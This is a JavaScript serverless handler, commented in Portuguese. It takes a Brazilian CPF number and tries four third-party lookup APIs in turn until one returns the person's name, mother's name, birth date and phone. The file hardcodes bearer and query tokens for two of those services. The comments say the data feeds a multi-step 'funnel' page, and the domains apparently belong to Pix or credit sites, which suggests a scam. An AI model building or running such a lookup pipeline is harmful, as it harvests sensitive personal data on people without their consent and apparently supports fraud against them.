// Proxy de consulta de CPF com CADEIA DE FALLBACK.
//
// Se a 1a API cair (erro, timeout, resposta vazia ou sem data de nascimento),
// a 2a assume automaticamente, e depois a 3a. So devolve erro se as TRES
// falharem — assim o funil nao para quando uma fonte sai do ar.
//
// Ordem: zapgroup -> cred-pix -> pix-sempre -> zipcardx (zapgroup 1a desde 16/10)
//
// Roda server-side de proposito: o pix-sempre NAO manda
// Access-Control-Allow-Origin (chamada direta do navegador seria bloqueada por
// CORS) e o token do zipcardx nao pode ficar exposto no HTML.
//
// Sempre normaliza a saida para { nome, mae, nascimento }, que e o que o
// 2.html consome. O campo "fonte" diz qual API respondeu (util pra depurar).

const TIMEOUT_MS = 4000; // por API; o 2.html aborta em 15s, cabe as tres

function fetchT(url, opts, ms) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms);
  return fetch(url, Object.assign({}, opts, { signal: c.signal })).finally(() => clearTimeout(t));
}

// Procura o campo em qualquer nivel do objeto (as APIs mudam o nome das chaves).
function achaCampo(obj, chaves) {
  if (!obj || typeof obj !== "object") return null;
  for (const k of chaves) {
    if (obj[k] !== undefined && obj[k] !== null && obj[k] !== "") return obj[k];
  }
  for (const k of Object.keys(obj)) {
    if (typeof obj[k] === "object" && obj[k] !== null) {
      const achou = achaCampo(obj[k], chaves);
      if (achou) return achou;
    }
  }
  return null;
}

// Normaliza data pra DD/MM/AAAA (algumas APIs devolvem ISO 1984-08-02).
function normalizaData(v) {
  const s = String(v || "").trim();
  const iso = s.match(/^(\d{4})-(\d{2})-(\d{2})/);
  return iso ? `${iso[3]}/${iso[2]}/${iso[1]}` : s;
}

function padroniza(data, fonte) {
  const nascimento = normalizaData(achaCampo(data, [
    "birthDate", "nascimento", "NASC", "nasc", "data_nascimento", "DATA_NASCIMENTO",
    "dataNascimento", "dt_nascimento", "DT_NASCIMENTO", "data_nasc", "birth", "birthday",
  ]));
  // Sem data de nascimento a etapa 3 do funil quebra -> trata como falha e cai na proxima API.
  if (!nascimento) return null;
  return {
    nome: achaCampo(data, ["name", "nome", "NOME", "Nome"]) || "Cliente",
    mae: achaCampo(data, ["motherName", "mae", "MAE", "nome_mae", "NOME_MAE", "nomeMae", "Nome_Mae"]) || "",
    nascimento,
    telefone: achaCampo(data, ["phone", "telefone", "TELEFONE", "celular"]) || "",
    fonte,
  };
}

// ── As tres fontes, na ordem em que sao tentadas ─────────────────────────────
const FONTES = [
  {
    // 16/10: token novo (o antigo dava "Token inválido"). E a 1a fonte porque as
    // outras tres estavam fora do ar (cred-pix sem nascimento, pix-sempre 530, zipcardx 401).
    nome: "zapgroup",
    consultar: async (cpf) => {
      const url = `https://api.zapgroup.shop/consultar-filtrada/cpf?cpf=${cpf}&token=8b00b8adc1f9cdc83f02d6c680b8d6fcce64e08c7907283a7c13e3616ac56635`;
      const r = await fetchT(url, { headers: { "User-Agent": "Mozilla/5.0" } }, TIMEOUT_MS);
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.json();
    },
  },
  {
    // Funil proprio do Kaua (cred-pix-top.com). Mesmo formato do pix-sempre.
    nome: "cred-pix",
    consultar: async (cpf) => {
      const r = await fetchT("https://cred-pix-top.com/api/cpf-lookup", {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
        body: JSON.stringify({ cpf }),
      }, TIMEOUT_MS);
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.json();
    },
  },
  {
    nome: "pix-sempre",
    consultar: async (cpf) => {
      const r = await fetchT("https://pix-sempre.com/api/cpf-lookup", {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
        body: JSON.stringify({ cpf }),
      }, TIMEOUT_MS);
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.json();
    },
  },
  {
    nome: "zipcardx",
    consultar: async (cpf) => {
      const r = await fetchT(`https://api.zipcardx.online/api/v1/consult/${encodeURIComponent(cpf)}`, {
        headers: {
          Authorization: "Bearer dc22fed4e36650211ed5cdee647f8e6db2cdb8dd300777eeedfc23c15e4fe1d1",
          Accept: "application/json",
          "User-Agent": "Mozilla/5.0",
        },
      }, TIMEOUT_MS);
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.json();
    },
  },
];

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "GET") return res.status(405).json({ error: "Method not allowed" });

  const cpf = String(req.query.cpf || "").replace(/\D/g, "");
  if (cpf.length !== 11) return res.status(400).json({ error: "CPF invalido" });

  // ?fonte=zipcardx forca uma fonte especifica — so pra teste/diagnostico.
  const so = String(req.query.fonte || "").trim().toLowerCase();
  const fontes = so ? FONTES.filter((f) => f.nome === so) : FONTES;
  if (!fontes.length) return res.status(400).json({ error: "Fonte desconhecida" });

  const falhas = [];
  for (const fonte of fontes) {
    try {
      const bruto = await fonte.consultar(cpf);
      const out = padroniza(bruto, fonte.nome);
      if (out) return res.json(Object.assign({ cpf }, out));
      falhas.push(fonte.nome + ": sem data de nascimento");
    } catch (err) {
      falhas.push(fonte.nome + ": " + err.message);
    }
    console.warn("[cpf] fonte falhou, tentando a proxima:", falhas[falhas.length - 1]);
  }

  console.error("[cpf] todas as fontes falharam:", falhas.join(" | "));
  return res.status(502).json({ error: "Erro ao consultar CPF", falhas });
};
